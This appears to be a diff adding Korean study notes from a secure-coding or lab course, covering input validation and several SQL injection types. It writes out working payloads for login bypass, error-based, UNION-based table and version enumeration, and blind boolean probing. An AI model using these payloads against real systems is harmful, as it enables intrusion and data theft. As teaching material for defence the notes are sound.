@@ -1,0 +1,81 @@
+id : admin'#
+pw : b'#
+
+select * from users where id = 'admin'# and pw = 'b'#'
+SQL 삽입(injection) 취약점을 이용한 인증과정 우회
+
+입력값 검증
+1) 정규화/규범화
+2) 새니타이즈
+3) 검증
+
+100 dollers / 일백달러 ===> $100
+<a>100</a>	<b>100</a> ===> <a>100</a><b>100</100> 데이터를 압축시켜 표현 규범화
+새니타이즈 : 인코딩
+
+
+if("<script>".equals(input)){...}
+
+"	<ScRipt>	"처럼 쓰면 검증로직을 못탈것이다.
+
+1. trim ==> "<ScRipt>"
+2. 소문자화 ==> "<script>" 그담에 검증
+
+입력 => 처리 => 출력
+
+select * from users where id = '____' and pw = '____'
+SQL 삽입의 종류 : 1. 폼값을 그대로 디비에 날리는 Form base SQLi
+2. 에러를 내서 내용을 보는 Error Based SQLi >>> a' and db_name() = 1 -- "dvwa"는 숫자형 데이터로 변환할 수 없습니다.
+3. stored procedure >>> a'; exec ....; --
+4. UNION based SQLi >>> 
+
+동이름 : abc
+>>> search.jsp?dong=abc
+select * form address where dong='abc';
+순번		동이름	우편번호	...
+1		서초동	32323
+2		구로동	34543
+...
+
+파라미터 : abc' union select ... --
+
+5. blind SQLi
+list.jsp?pno=1 >>> 1페이지 목록
+list.jsp?pno=999 >>> 존재하지 않는 데이터입니다.
+
+list.jsp?pno=1 and 1=1 >>> 1페이지 목록
+list.jsp?pno=1 and 1=2 >>> 존재하지 않는 데이터입니다.
+
+list.jsp?pno 1 and (select ....) 1페이지 목록이 나오면 >> 내 쿼리가 true
+아니면 false
+
+
+webgoat lab
+login.jsp?id=112&pw=abc
+select * from user where id=112 and pw='abc'
+max-length 걸어봤자 개발자도구에서 풀림
+
+
+ibatis에서 #과 $의 차이 : 
+select * from user where id=#pid# and pw='$ppw$'
+>>> ... where id = ? and pw = 'abc'
+
+pid >>> 123
+sharp >>> #
+select * from users where id$sharp$ = #pid#
+
+
+union 사용하기
+select * from address where dong = '하대동' order by 8--'
+오류나면 컬럼수는 7개
+where dong='a' and 1=2--' : 정상쿼리의 실행결과가 없도록...
+
+DBMS 정보를 조회
+where dong = 'a' and 1=2 union select @@version,2,3,4,5,6,7 --'
+DBMS 버전 확인이 가능
+
+
+sysobject 테이블을 이용해 사용자정의 테이블을 조회
+where dong = 'a' and 1=2 union select 1,name,3,4,5,6,7 from sysobjects where xtype='U'--'
+
+개나소나다하는sql인젝션 - pangolin
